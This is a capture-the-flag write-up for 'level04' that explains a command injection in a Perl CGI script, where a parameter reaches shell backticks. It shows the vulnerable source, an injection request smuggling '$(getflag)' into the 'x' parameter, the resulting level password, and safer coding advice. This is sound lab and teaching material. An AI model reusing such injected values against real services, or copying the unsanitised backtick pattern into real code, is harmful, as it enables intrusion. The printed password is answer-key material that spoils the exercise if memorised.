# level04

## Goal

Exploit a vulnerable CGI Perl script to execute arbitrary commands with the privileges of the `flag04` user.

## Enumeration

Inspect the available script:

```bash
cat level04.pl
```

Source code:

```perl
#!/usr/bin/perl
# localhost:4747

use CGI qw{param};

print "Content-type: text/html\n\n";

sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
}

x(param("x"));
```

The script is executed as a CGI service on **localhost:4747**.

## Analysis

The `x` HTTP parameter is passed directly to a Perl backtick expression:

```perl
print `echo $y 2>&1`;
```

Perl backticks execute their content through the system shell.

Since user input is not sanitized, arbitrary shell commands can be injected.

This is a classic **Command Injection** vulnerability.

## Exploitation

Send a request to the CGI service:

```bash
curl 'http://localhost:4747/?x=$(getflag)'
```

The injected command is evaluated by the shell:

```bash
echo $(getflag) 2>&1
```

`getflag` is executed with the privileges of the `flag04` user.

## Validation

Output:

```text
Check flag.Here is your token :
ne2searoevaevoem4ov4ar8ap
```

The returned token is the password for `level05`.

## Concept

This level demonstrates a **Command Injection** vulnerability caused by executing unsanitized user input inside shell backticks.

Unsafe code:

```perl
print `echo $y 2>&1`;
```

Safer alternatives include:

* avoiding shell execution entirely;
* validating and sanitizing user input;
* using Perl functions that do not invoke a shell.

## Resources

Useful commands:

```bash
cat level04.pl
strings level04.pl
curl 'http://localhost:4747/?x=test'
curl 'http://localhost:4747/?x=$(getflag)'
```

The key observation is that the CGI parameter is directly interpreted by the shell, allowing arbitrary command execution.
